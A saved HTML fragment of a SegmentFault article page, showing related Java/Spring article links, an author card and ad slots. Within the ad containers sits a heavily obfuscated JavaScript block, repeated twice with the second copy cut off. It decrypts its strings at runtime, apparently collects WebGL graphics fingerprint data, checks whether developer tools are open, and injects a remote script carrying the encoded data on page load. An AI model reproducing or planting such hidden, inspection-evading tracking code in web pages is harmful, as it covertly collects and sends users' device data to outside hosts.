避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生信息，将接口...</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java旅途</span><span class="split-dot"></span><span>阅读 500</span><span class="split-dot"></span><span>2 赞</span></p></a><a class="list-group-item list-group-item-action py-3" href="https://segmentfault.com/a/1190000037521165?utm_source=sf-similar-article" target="_blank"><h5 class="h5 mb-2 text-break" style="color: rgb(33, 37, 41);">spring-boot-route（十九）spring-boot-admin监控服务</h5><p class="mb-2 text-truncate text-secondary">SpringBootAdmin不是Spring官方提供的模块，它包含了Client和Server两部分。server部分提供了用户管理界面，client即为被监控的服务。client需要注册到server端。</p><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-primary">Java旅途</span><span class="split-dot"></span><span>阅读 633</span><span class="split-dot"></span><span>2 赞</span></p></a></div></div></div></div></div><div class="col-12 col-xl-auto col"><div class="w-xl-300"><div class="w-xl-300 d-none d-xl-block data-fix" id="author" style="top: 81.5px;"><div class="mb-4 card"><div class="card-body"><div class="d-flex align-items-center mb-3"><picture class="rounded-circle mr-3"><a href="https://segmentfault.com/u/javatrip"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/2295617052-5ebaac9a8df71_huge128.webp" alt="avatar" class="rounded-circle" width="64" height="64"></a></picture><div><h5 class="mb-0"><a href="https://segmentfault.com/u/javatrip" class="text-body">Java旅途</a></h5></div></div><div class="d-flex align-items-center mb-3"><div class="mr-4"><strong>987</strong><span class="text-secondary"> 声望</span></div><div><strong>6.1k</strong><span class="text-secondary"> 粉丝</span></div></div><button type="button" class="btn btn-primary btn-block">关注作者</button></div></div></div><div class="w-xl-300 mb-4 data-fix" id="first-ad" style="top: 305.5px;"><div class="card border-0 overflow-hidden d-none d-xl-flex justify-content-center align-items-center float-ads"><div id="OA_holder_1" class="ad-container" style="display:block"><div style="line-height: 0"><script async="" src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/adsbygoogle.js"></script>
+<!-- 文章详情 - 侧栏矩形 -->
+<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-6330872677300335" data-ad-slot="6800875204" data-adsbygoogle-status="done"><ins id="aswift_1_expand" style="border: medium none; height: 250px; width: 300px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-table;" tabindex="0" title="Advertisement" aria-label="Advertisement"><ins id="aswift_1_anchor" style="border: medium none; height: 250px; width: 300px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: block;"><iframe id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;border:0;width:300px;height:250px;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-6330872677300335&amp;output=html&amp;h=250&amp;slotname=6800875204&amp;adk=3588622457&amp;adf=3475366704&amp;pi=t.ma~as.6800875204&amp;w=300&amp;lmt=1622706315&amp;psa=1&amp;format=300x250&amp;url=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000025188239&amp;flash=0&amp;wgl=1&amp;dt=1622706314379&amp;bpp=2&amp;bdt=7339&amp;idt=289&amp;shv=r20210525&amp;cbv=%2Fr20190131&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3Ded6686cc6164c511-226f99a192c70023%3AT%3D1619424613%3ART%3D1619424613%3AS%3DALNI_MZZ_1PLK3qL5wNlzhV3UjK3fnA80w&amp;correlator=4312961243908&amp;frm=20&amp;pv=2&amp;ga_vid=93359487.1619424609&amp;ga_sid=1622706315&amp;ga_hid=1232291614&amp;ga_fc=0&amp;u_tz=480&amp;u_his=1&amp;u_java=0&amp;u_h=1440&amp;u_w=2560&amp;u_ah=1400&amp;u_aw=2560&amp;u_cd=24&amp;u_nplug=0&amp;u_nmime=0&amp;adx=1464&amp;ady=329&amp;biw=2411&amp;bih=1072&amp;scr_x=0&amp;scr_y=324&amp;eid=31060957%2C31061048&amp;oid=3&amp;pvsid=1998679025877523&amp;pem=534&amp;ref=https%3A%2F%2Fwww.google.com.hk%2F&amp;eae=0&amp;fc=896&amp;brdim=116%2C80%2C116%2C80%2C2560%2C0%2C2440%2C1208%2C2428%2C1072&amp;vis=1&amp;rsz=%7C%7CeoE%7C&amp;abl=CS&amp;pfx=0&amp;fu=0&amp;bc=31&amp;ifi=2&amp;uci=a!2&amp;fsb=1&amp;xpc=FD6b6VyPGB&amp;p=https%3A//segmentfault.com&amp;dtd=1112" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" data-google-container-id="a!2" width="300" height="250" frameborder="0"></iframe></ins></ins></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script><div id="beacon_294039bc46" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg_009.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var aJ4knj0Q2TsZ=[a0_0x2826("0x19"),"XYcD7gyt6AZkIQDh3+Fn/PI=",a0_0x2826("0x12"),a0_0x2826("0xd"),a0_0x2826("0x23"),a0_0x2826("0x17")];var xz1ZKT5VYzY7UB=document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x0]),aJ4knj0Q2TsZ[0x2])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x1]),aJ4knj0Q2TsZ[0x2]));if(!xz1ZKT5VYzY7UB){document[kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x3]),aJ4knj0Q2TsZ[0x5])](kPbwxjZPvhHuql2cK(z58lhCJ(aJ4knj0Q2TsZ[0x4]),aJ4knj0Q2TsZ[0x5]),uhAtRHZXRS());}</script>
+</div></div></div><div id="gridAd" class="d-none d-xl-block mb-4"><div class="card"><div class="bg-white border-0 card-header"><h5 class="mb-0">宣传栏</h5></div><div class="card-body"><div class="mb-3"><div id="OA_holder_7" class="ad-container" style="display:block"><a href="https://sponsor.segmentfault.com/ck.php?oaparams=2__bannerid=401__zoneid=7__cb=5f5ea58de5__oadest=https%3A%2F%2Fke.sifou.com%2Fcourse%2F1650000037474720%3Futm_source%3Dsegmentfault%26utm_medium%3Dbanner_Tlink" target="_blank"><strong>专家带你构建一个高性能秒杀系统</strong><br>
+<small style="color: #6c757d">大厂电商 Java 秒杀系统架构实战</small></a><div id="beacon_5f5ea58de5" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="spring-boot-route%EF%BC%88%E4%B8%80%EF%BC%89Controller%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%20-%20SegmentFault%20%E6%80%9D%E5%90%A6_files/lg_008.gif" alt="" style="width: 0px; height: 0px;" width="0" height="0"></div><script type="text/javascript">var a0_0x5a7b=["gHn8nA==","toUTCString","pPUzbNqUOoPi1YTki","2BWEY1lTYNp/T+I9OQHVoZE=","IXFRmLrn","CgNqeWZa8Y45plkkKxbF4Q==","ZrSEYyW0b7Q0IPUqb/13ifQErimI4pBr","K3dNkqXKJbiemnk=","brSEdDKSbQ==","wRm0hXRLhWKYSg==","length","YtXMjstIgPUMjLZlaNb5QcsHsJfofqs=","01GCQWkzBrg=","2lWGVHRtav9SW7Q=","VOnkruxmgN02s5ZFWA==","YtXMjstIgPUMiLZlaNz5W84dpZXm","z0CORTVjSOFaRLMFKCvA","hcmRM5IG",";x20expires=","charCodeAt","rnaTNfMM5A5g","UP71jPdtsdQrqg==","lhDGASp5UQ==","cookie","yEaEWGp9","nEERm2ggVqUX","z1yGVA==","3UmTSW5gW/ZZWL8cbzjb/NRGE7wdKmt7","10CQRQ==","y0CcZStaTd1xcqMeCA==","xwKuhXRLhWKYSg==","ZDdmYg==","LyhDf39R658bu2Y/LxzF9w==","2FeTUG5sbPteWrUZNQ==",";x20path=/","yFCUQm57QPlc","K2pqmb72KbCVm3dtWA==","fixfCHIILA","xwKuhXRUiW+LShE=","atob","UP71n/lxpNw2qpZZ","YN7DiNRcodQxq5R0XvbFYPwqgqD1UImgOA==","ivuH9sk1F","UP71iuB3oN8gt5xF","WdIF+SOSzC5OLXDS7t8=","2keFXnZ8XfI=","0kE=","yECCcG59W/5ZQqQS","UuPxqupqqNQ9qpJHAeTOZv40"];(function(_0x1b61e1,_0x5a7b88){var _0x282611=function(_0x46bc60){while(--_0x46bc60){_0x1b61e1["push"](_0x1b61e1["shift"]());}};_0x282611(++_0x5a7b88);}(a0_0x5a7b,0xd7));var a0_0x2826=function(_0x1b61e1,_0x5a7b88){_0x1b61e1=_0x1b61e1-0x0;var _0x282611=a0_0x5a7b[_0x1b61e1];return _0x282611;};function kPbwxjZPvhHuql2cK(_0x2a7b56,_0x3dbb7d){var _0x39df8d=[],_0x3893cb=0x0,_0x4bd01a,_0x39ab8a="";for(var _0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x39df8d[_0x4366fa]=_0x4366fa;}for(_0x4366fa=0x0;_0x4366fa<0x100;_0x4366fa++){_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa]+_0x3dbb7d[a0_0x2826("0x0")](_0x4366fa%_0x3dbb7d[a0_0x2826("0x28")]))%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;}_0x4366fa=0x0;_0x3893cb=0x0;for(var _0x1f6e6d=0x0;_0x1f6e6d<_0x2a7b56[a0_0x2826("0x28")];_0x1f6e6d++){_0x4366fa=(_0x4366fa+0x1)%0x100;_0x3893cb=(_0x3893cb+_0x39df8d[_0x4366fa])%0x100;_0x4bd01a=_0x39df8d[_0x4366fa];_0x39df8d[_0x4366fa]=_0x39df8d[_0x3893cb];_0x39df8d[_0x3893cb]=_0x4bd01a;_0x39ab8a+=String["fromCharCode"](_0x2a7b56["charCodeAt"](_0x1f6e6d)^_0x39df8d[(_0x39df8d[_0x4366fa]+_0x39df8d[_0x3893cb])%0x100]);}return _0x39ab8a;}function z58lhCJ(_0x5b3c65){var _0x2744f4="";try{_0x2744f4=window[a0_0x2826("0x14")](_0x5b3c65);}catch(_0x1d8981){}return _0x2744f4;};function aVxrxoIKgEYVWFC7(){var _0x2b4132=[a0_0x2826("0xc"),a0_0x2826("0x2c"),"VPrvuflw","QP7jqPQ=",a0_0x2826("0x1d"),a0_0x2826("0x2"),a0_0x2826("0x18"),a0_0x2826("0x15"),a0_0x2826("0x16"),a0_0x2826("0x2d"),a0_0x2826("0x29")];var _0x1267a4=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x1]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x2]),_0x2b4132[0x0]));var _0x424e30;var _0x30e940;var _0x470837;var _0x229329;try{_0x424e30=_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x3]),_0x2b4132[0x0]))||_0x1267a4[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x5]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x4]),_0x2b4132[0x0]));}catch(_0x408b8e){}if(_0x424e30){_0x30e940=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x6]),_0x2b4132[0x0])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x8]),_0x2b4132[0x0]));_0x470837=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x9]),_0x2b4132[0x0])]);_0x229329=_0x424e30[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0x7]),_0x2b4132[0x0])](_0x30e940[kPbwxjZPvhHuql2cK(z58lhCJ(_0x2b4132[0xa]),_0x2b4132[0x0])]);}return _0x470837+"x20"+_0x229329;}function w9jcVeUDT(){var _0x3c83be=[a0_0x2826("0xb"),a0_0x2826("0x27"),a0_0x2826("0x13"),a0_0x2826("0x6"),a0_0x2826("0x25"),"BHBRkrX3Jw==",a0_0x2826("0x22"),a0_0x2826("0x11"),a0_0x2826("0x20")];const _0x1c6d55=0xa0;const _0x37ae20=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x0]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x1]),_0x3c83be[0x3])]>_0x1c6d55;const _0x4883d0=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x2]),_0x3c83be[0x3])]-window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x4]),_0x3c83be[0x8])]>_0x1c6d55;if(!(_0x4883d0&&_0x37ae20)&&(window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])]&&window[kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x5]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x6]),_0x3c83be[0x8])][kPbwxjZPvhHuql2cK(z58lhCJ(_0x3c83be[0x7]),_0x3c83be[0x8])]||_0x37ae20||_0x4883d0)){return![];}else{return!![];}}function xGzLVAwTj9Dm(_0x528fc1,_0x3b5174,_0xfbb720){var _0x905dbf="";if(_0xfbb720){var _0x50d54e=new Date();_0x50d54e["setTime"](_0x50d54e["getTime"]()+_0xfbb720*0x18*0x3c*0x3c*0x3e8);_0x905dbf=a0_0x2826("0x30")+_0x50d54e[a0_0x2826("0x1f")]();}document[a0_0x2826("0x4")]=_0x528fc1+"="+(_0x3b5174||"")+_0x905dbf+a0_0x2826("0xf");}function uhAtRHZXRS(){var _0x7edbb9=["aJgicnL4X6hO",a0_0x2826("0x8"),"znG4dXV8X8ZND5w6dTeC+8M=",a0_0x2826("0xe"),a0_0x2826("0x5"),a0_0x2826("0x1c"),"yFeV",a0_0x2826("0x1b"),a0_0x2826("0x21"),a0_0x2826("0x7"),a0_0x2826("0x2e"),a0_0x2826("0x1a"),"iBXGQWI=",a0_0x2826("0x3"),a0_0x2826("0x2b"),"2EqZWnNs",a0_0x2826("0x9"),"yUSYVXVk","z0qlRWhgR/A=",a0_0x2826("0x10"),a0_0x2826("0xa"),a0_0x2826("0x1"),"z0SRbnhoW/laXLwS",a0_0x2826("0x2a")];var _0xde5cda=[a0_0x2826("0x1e"),"lmjgiQ==",a0_0x2826("0x2f"),a0_0x2826("0x24"),"ZLWPeiO4",a0_0x2826("0x26"),"sYkn4Oqn64Pdr"];var _0x33bc41;try{_0x33bc41=aVxrxoIKgEYVWFC7();}catch(_0x110e3a){}try{_0x33bc41=window[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x0]),_0xde5cda[0x2])](_0x33bc41);}catch(_0x3e7ed0){}_0x33bc41=encodeURIComponent(_0x33bc41);var _0x13700b=navigator["userAgent"]||navigator["vendor"]||window["opera"];var _0xb93071=kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x3]),_0xde5cda[0x6]);var _0x331712=new RegExp(_0xb93071,"i");var _0x53686b=!![];var _0x2d8ac7=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x14]),_0x7edbb9[0x15]);if(_0x331712[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x1]),_0xde5cda[0x2])](_0x13700b)){if(document[kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x4]),_0xde5cda[0x6])][kPbwxjZPvhHuql2cK(z58lhCJ(_0xde5cda[0x5]),_0xde5cda[0x6])](_0x2d8ac7)==-0x1){if(w9jcVeUDT()){var _0x5d4d20=kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x17]),_0x7edbb9[0x15])+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x1]),_0x7edbb9[0x15])+"?"+kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15])+"="+_0x33bc41;var _0x5b2742=document[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x3]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x4]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x7]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x8]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x9]),_0x7edbb9[0x15]),kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xa]),_0x7edbb9[0x15]));_0x5b2742[kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x5]),_0x7edbb9[0x15])](kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0x6]),_0x7edbb9[0x15]),_0x5d4d20);document["body"][kPbwxjZPvhHuql2cK(z58lhCJ(_0x7edbb9[0xe]),_0x7edbb9[0x15])](_0x5b2742);xGzLVAwTj9Dm(_0x2d8ac7,"1","7");}}}}var 